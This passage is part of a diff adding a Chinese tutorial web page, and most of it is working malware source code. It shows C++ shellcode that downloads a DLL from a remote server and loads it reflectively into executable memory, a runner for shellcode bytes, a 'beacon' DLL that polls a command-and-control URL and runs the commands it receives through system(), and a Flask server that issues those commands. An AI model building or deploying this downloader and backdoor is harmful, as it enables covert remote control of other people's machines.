+    WinHttpSendRequestT fnWinHttpSendRequest = (WinHttpSendRequestT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpSendRequest);
+    WinHttpReceiveResponseT fnWinHttpReceiveResponse = (WinHttpReceiveResponseT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpReceiveResponse);
+    WinHttpQueryHeadersT fnWinHttpQueryHeaders = (WinHttpQueryHeadersT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpQueryHeaders);
+    WinHttpCloseHandleT fnWinHttpCloseHandle = (WinHttpCloseHandleT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpCloseHandle);
+    mallocT fnMalloc = (mallocT)fnGetProcAddress(fnLoadlibrary(strMsvcrt), strMalloc);
+    WinHttpReadDataT fnWinHttpReadData = (WinHttpReadDataT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpReadData);
+
+    memcpyT fnMemcpy = (memcpyT)fnGetProcAddress(fnLoadlibrary(strMsvcrt), (char*)strMemcpy);
+    // 创建一个会话
+    fnWinHttpCrackUrl(strUrl, 0, ICU_ESCAPE, &amp;lpUrlComponents);
+    HINTERNET hSession = fnWinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
+    DWORD dwReadBytes, dwSizeDW = sizeof(dwSizeDW), dwContentSize, dwIndex = 0;
+
+
+    // 创建一个连接
+    HINTERNET hConnect = fnWinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0);
+    // 创建一个请求，先查询内容的大小
+    HINTERNET hRequest = fnWinHttpOpenRequest(hConnect, strHead, lpUrlComponents.lpszUrlPath, strHTTP, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
+    fnWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    fnWinHttpReceiveResponse(hRequest, 0);
+    fnWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &amp;dwContentSize, &amp;dwSizeDW, &amp;dwIndex);
+    fnWinHttpCloseHandle(hRequest);
+
+
+
+    //hRequest = fnWinHttpOpenRequest(hConnect, strGet, lpUrlComponents.lpszUrlPath, strHTTP, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
+    //fnWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    //fnWinHttpReceiveResponse(hRequest, 0);
+    //pBuffer = fnMalloc(dwContentSize);
+
+    hRequest = fnWinHttpOpenRequest(hConnect, strGet, lpUrlComponents.lpszUrlPath, strHTTP, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
+    fnWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    fnWinHttpReceiveResponse(hRequest, 0);
+    typedef LPVOID(WINAPI* VirtualAllocT)(
+        _In_opt_ LPVOID lpAddress,
+        _In_     SIZE_T dwSize,
+        _In_     DWORD flAllocationType,
+        _In_     DWORD flProtect);
+    constexpr char strVirtualAlloc[] = &quot;VirtualAlloc&quot;;
+    VirtualAllocT fnVirtualAlloc = (VirtualAllocT)fnGetProcAddress((HMODULE)kernel32_base, (char*)strVirtualAlloc);
+    //别介意代码风格突变,这是另外一个项目复制粘贴的.
+    const auto fileSize = dwContentSize;
+    void* rawBuffer = fnVirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    fnWinHttpReadData(hRequest, rawBuffer, fileSize, &amp;dwReadBytes);
+
+
+    //ZeroMemory(pBuffer, dwContentSize);
+    //完成下载
+    //fnWinHttpReadData(hRequest, pBuffer, dwContentSize, &amp;dwReadBytes);
+
+    fnWinHttpCloseHandle(hRequest);
+    fnWinHttpCloseHandle(hConnect);
+    fnWinHttpCloseHandle(hSession);
+
+
+    PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)rawBuffer;
+    PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((LPBYTE)rawBuffer + pIDH-&gt;e_lfanew);
+
+    void* imageBuffer = fnVirtualAlloc(NULL, pINH-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    fnMemcpy(imageBuffer, rawBuffer, pINH-&gt;OptionalHeader.SizeOfHeaders);
+
+    PIMAGE_SECTION_HEADER pISH = (PIMAGE_SECTION_HEADER)(pINH + 1);
+
+    for (size_t i = 0; i &lt; pINH-&gt;FileHeader.NumberOfSections; i++)
+    {
+        fnMemcpy((PVOID)((LPBYTE)imageBuffer + pISH[i].VirtualAddress), (PVOID)((LPBYTE)rawBuffer + pISH[i].PointerToRawData), pISH[i].SizeOfRawData);
+    }
+
+    DWORD delta = (DWORD)((LPBYTE)imageBuffer - pINH-&gt;OptionalHeader.ImageBase); // Calculate the delta
+    PIMAGE_BASE_RELOCATION pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)imageBuffer + pINH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+    while (pIBR-&gt;VirtualAddress)
+    {
+        if (pIBR-&gt;SizeOfBlock &gt;= sizeof(IMAGE_BASE_RELOCATION))
+        {
+            DWORD count = (pIBR-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+            PWORD list = (PWORD)(pIBR + 1);
+
+            for (size_t i = 0; i &lt; count; i++)
+            {
+                if (list[i])
+                {
+                    PDWORD ptr = (PDWORD)((LPBYTE)imageBuffer + (pIBR-&gt;VirtualAddress + (list[i] &amp; 0xFFF)));
+                    *ptr += delta;
+                }
+            }
+        }
+
+        pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR-&gt;SizeOfBlock);
+    }
+
+    //导入表修复
+    PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)imageBuffer + pINH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+    while (pIID-&gt;Characteristics)
+    {
+        PIMAGE_THUNK_DATA OrigFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)imageBuffer + pIID-&gt;OriginalFirstThunk);
+        PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)imageBuffer + pIID-&gt;FirstThunk);
+
+        HANDLE hModule = fnLoadlibrary((LPCSTR)imageBuffer + pIID-&gt;Name);
+
+        while (OrigFirstThunk-&gt;u1.AddressOfData)
+        {
+            if (OrigFirstThunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG)
+            {
+                // Import by ordinal
+
+                DWORD Function = (DWORD)fnGetProcAddress((HMODULE)hModule, (char*)(OrigFirstThunk-&gt;u1.Ordinal &amp; 0xFFFF));
+                FirstThunk-&gt;u1.Function = Function;
+            }
+
+            else
+            {
+                // Import by name
+                PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)imageBuffer + OrigFirstThunk-&gt;u1.AddressOfData);
+                DWORD Function = (DWORD)fnGetProcAddress((HMODULE)hModule, (char*)pIBN-&gt;Name);
+
+                FirstThunk-&gt;u1.Function = Function;
+            }
+
+            OrigFirstThunk++;
+            FirstThunk++;
+        }
+
+        pIID++;
+    }
+
+    //一切就绪 call一下entry
+    typedef BOOL(WINAPI* PDLL_MAIN)(HMODULE, DWORD, PVOID);
+    PDLL_MAIN EntryPoint = (PDLL_MAIN)((LPBYTE)imageBuffer + pINH-&gt;OptionalHeader.AddressOfEntryPoint);
+    EntryPoint((HMODULE)imageBuffer, DLL_PROCESS_ATTACH, NULL); // Call the entry point
+
+    char str3[] = { 'U','S','E','R','3','2','.','d','l','l','/0' };
+    char str4[] = { 'M','e','s','s','a','g','e','B','o','x','A','/0' };
+    char str5[] = { 'h','e','l','l','o',' ','w','o','r','l','d','/0' };
+    typedef int (WINAPI* MessageBoxAT)(_In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);
+    MessageBoxAT pMessageBoxA = (MessageBoxAT)fnGetProcAddress(fnLoadlibrary(str3), str4);
+    if (pMessageBoxA == NULL) {
+        __debugbreak();
+    }
+    pMessageBoxA(NULL, str5, NULL, NULL);
+    if (fnLoadlibrary == NULL || fnGetProcAddress == NULL) {
+        __debugbreak();
+    }
+
+    //printf(&quot;kernel32: %p fnGetProcAddress :%p/n&quot;, fnLoadlibrary, fnGetProcAddress);
+}
+void shellcode_end() {
+    __debugbreak();
+}
+int main()
+{
+    const auto start_address = (uint32_t)shellcode_start;
+    const auto shellcode_size = (uint32_t)shellcode_end - (uint32_t)start_address;
+    for (size_t i = 0; i &lt; shellcode_size; i++)
+    {
+        auto sig_code = ((unsigned char*)start_address)[i];
+        printf(&quot;,0x%02X&quot;, sig_code);
+    }
+    std::cout &lt;&lt; &quot;Hello World!/n&quot;;
+    printf(&quot;start_address: %p /n&quot;, start_address);
+    shellcode_start();
+    char shellcode[] = {...};//...这里放shellcode
+    PVOID p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(p, shellcode, sizeof(shellcode));
+    typedef void(__stdcall* door_code) ();
+    door_code run_shellcode = (door_code)p;
+    run_shellcode();
+    system(&quot;pause&quot;);
+}
+
+</code></pre>
+<p>beacon.dll的完整代码如下：</p>
+<pre><code>// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include &quot;pch.h&quot;
+
+#define WINHTTP_STACK_LIMIT 64
+
+#include &lt;Windows.h&gt;
+#include &lt;winhttp.h&gt;
+#include &lt;string&gt;
+#include &lt;vector&gt;
+#include &lt;random&gt;
+#pragma comment(lib, &quot;winhttp.lib&quot;)
+
+typedef struct _winhttp_url_custom_stack {
+    wchar_t szScheme[WINHTTP_STACK_LIMIT];
+    wchar_t szHostName[WINHTTP_STACK_LIMIT];
+    wchar_t szUserName[WINHTTP_STACK_LIMIT];
+    wchar_t szPassword[WINHTTP_STACK_LIMIT];
+    wchar_t szUrlPath[WINHTTP_STACK_LIMIT];
+    wchar_t szExtraInfo[WINHTTP_STACK_LIMIT];
+} _winhttp_url_custom_stack;
+
+namespace Winhttp {
+    auto initParams(URL_COMPONENTS* urlParams,
+        _winhttp_url_custom_stack* inputParams) -&gt; void {
+        urlParams-&gt;dwStructSize = sizeof(URL_COMPONENTS);
+        urlParams-&gt;lpszExtraInfo = inputParams-&gt;szExtraInfo;
+        urlParams-&gt;lpszHostName = inputParams-&gt;szHostName;
+        urlParams-&gt;lpszPassword = inputParams-&gt;szPassword;
+        urlParams-&gt;lpszScheme = inputParams-&gt;szScheme;
+        urlParams-&gt;lpszUrlPath = inputParams-&gt;szUrlPath;
+        urlParams-&gt;lpszUserName = inputParams-&gt;szUserName;
+
+        urlParams-&gt;dwExtraInfoLength = urlParams-&gt;dwHostNameLength =
+            urlParams-&gt;dwPasswordLength = urlParams-&gt;dwSchemeLength =
+            urlParams-&gt;dwUrlPathLength = urlParams-&gt;dwUserNameLength =
+            WINHTTP_STACK_LIMIT;
+    }
+    auto Get(std::wstring url, void** outBuffer, size_t&amp; outBufferSize) -&gt; bool {
+        _winhttp_url_custom_stack winHttpStack = { 0 };
+        URL_COMPONENTS urlParams = { 0 };
+        HINTERNET httpSession = 0, httpConnectHandle = 0, httpRequest = 0;
+        initParams(&amp;urlParams, &amp;winHttpStack);
+        void* buffer = nullptr;
+        size_t bufferSize = 0;
+        size_t readSize = 0;
+        size_t realySize = 0;
+        bool status = false;
+        DWORD headBufferSize = sizeof(headBufferSize), headContextSize,
+            headIndex = 0;
+        do {
+            auto httpStatus =
+                WinHttpCrackUrl(url.c_str(), url.size(), ICU_DECODE, &amp;urlParams);
+            if (httpStatus == false) {
+                break;
+            }
+            httpSession =
+                WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
+            if (httpSession == 0) {
+                break;
+            }
+            httpConnectHandle = WinHttpConnect(httpSession, urlParams.lpszHostName,
+                urlParams.nPort, 0);
+            if (httpConnectHandle == 0) {
+                break;
+            }
+
+            httpRequest = WinHttpOpenRequest(
+                httpConnectHandle, L&quot;GET&quot;, urlParams.lpszUrlPath, L&quot;HTTP/1.1&quot;,
+                WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+                WINHTTP_FLAG_REFRESH);
+            if (httpRequest == 0) {
+                break;
+            }
+            if (WinHttpSendRequest(httpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                WINHTTP_NO_REQUEST_DATA, 0, 0, 0) == false) {
+                break;
+            }
+            if (WinHttpReceiveResponse(httpRequest, 0) == false) {
+                break;
+            }
+            if (WinHttpQueryDataAvailable(
+                httpRequest, reinterpret_cast&lt;LPDWORD&gt;(&amp;realySize)) == false) {
+                break;
+            }
+            buffer = malloc(realySize);
+            if (buffer == nullptr) {
+                break;
+            }
+            memset(buffer, 0, realySize);
+            bufferSize = realySize;
+            if (WinHttpReadData(httpRequest, buffer, realySize,
+                reinterpret_cast&lt;LPDWORD&gt;(&amp;realySize)) == false) {
+                break;
+            }
+            status = true;
+        } while (false);
+        if (status) {
+            *outBuffer = buffer;
+            outBufferSize = bufferSize;
+        }
+        else {
+            if (buffer != nullptr) {
+                free(buffer);
+            }
+        }
+        // close
+        if (httpRequest != 0) {
+            WinHttpCloseHandle(httpRequest);
+        }
+        if (httpConnectHandle != 0) {
+            WinHttpCloseHandle(httpConnectHandle);
+        }
+        if (httpSession != 0) {
+            WinHttpCloseHandle(httpSession);
+        }
+        return status;
+    }
+}
+    namespace Auth {
+        std::string localKey;
+        auto strRand(int length) -&gt; std::string {
+            char tmp;
+            std::string buffer;
+            std::random_device rd;
+            std::default_random_engine random(rd());
+            for (int i = 0; i &lt; length; i++) {
+                tmp = random() % 36;
+                if (tmp &lt; 10) {
+                    tmp += '0';
+                }
+                else {
+                    tmp -= 10;
+                    tmp += 'A';
+                }
+                buffer += tmp;
+            }
+            return buffer;
+        }
+        bool CheckPassword(std::string key) { return key == localKey; }
+        void Init() { localKey = strRand(6); }
+    }  // namespace Auth
+    namespace Beacon {
+    void loopWork() {
+        static const std::wstring cmdUrl =
+            L&quot;http://192.168.1:5000/api/v1/client/get_cmd&quot;;
+        Auth::Init();
+        printf(&quot;你的本地密钥是: %s 请不要随便分享给其他人/n&quot;,
+            Auth::localKey.c_str());
+        do {
+            void* buffer = nullptr;
+            size_t bufferSize = 0;
+
+            bool status = Winhttp::Get(cmdUrl, &amp;buffer, bufferSize);
+            if (status &amp;&amp; buffer != nullptr) {
+                std::string serverCmd =
+                    std::string(reinterpret_cast&lt;char*&gt;(buffer), bufferSize);
+                if (serverCmd.size() &gt; 0) {
+                    std::string key = serverCmd.substr(0, 6);
+                    if (Auth::CheckPassword(key)) {
+                        std::string cmd = serverCmd.substr(7, serverCmd.size());
+                        printf(&quot;cmd: %s /n&quot;, cmd.c_str());
+                        system(cmd.c_str());
+                    }
+                }
+                free(buffer);
+            }
+            Sleep(1000);
+        } while (true);
+    }
+
+    auto easyCreateThread(void* pFunctionAddress, void* pParams) -&gt; HANDLE {
+        return CreateThread(
+            NULL, NULL, reinterpret_cast&lt;LPTHREAD_START_ROUTINE&gt;(pFunctionAddress),
+            static_cast&lt;LPVOID&gt;(pParams), NULL, NULL);
+    }
+    auto Work() -&gt; void {
+        easyCreateThread(reinterpret_cast&lt;void*&gt;(loopWork), nullptr);
+    }
+}  // namespace Winhttp
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
+    LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        Beacon::Work();
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+/*
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        MessageBoxA(NULL, &quot;hello i am beacon&quot;, NULL, NULL);
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+*/
+</code></pre>
+<p>main.py的完整代码如下：</p>
+<pre><code>from flask import Flask
+from flask import request
+app = Flask(__name__)
+
+g_cmd = &quot;&quot;
+
+@app.route('/api/v1/client/get_cmd', methods=['GET'])
+def client_get_cmd():
+    global g_cmd
+    return g_cmd
+
+g_respone = &quot;&quot;
+
+@app.route('/api/v1/server/get_respone', methods=['POST'])
+def server_get_respone():
+    global g_respone
+    g_respone = request.data.decode()
+    return &quot;1337&quot;
+
+@app.route('/api/v1/server/send_cmd', methods=['GET'])
+def client_send_cmd():
+    global g_cmd
+    g_cmd = request.args.get('key') + &quot;|&quot; + request.args.get('cmd')
+    return {'success': True, 'cmd': g_cmd}
+
+@app.route('/api/v1/server/get_client_respone', methods=['GET'])
+def server_get_client_respone():
+    global g_respone
+    return g_respone
+
+@app.route(&quot;/&quot;)
+def root():
+    return '你好世界'
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(debug=True, host=&quot;0.0.0.0&quot;)
+
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.top", "search.highlight", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
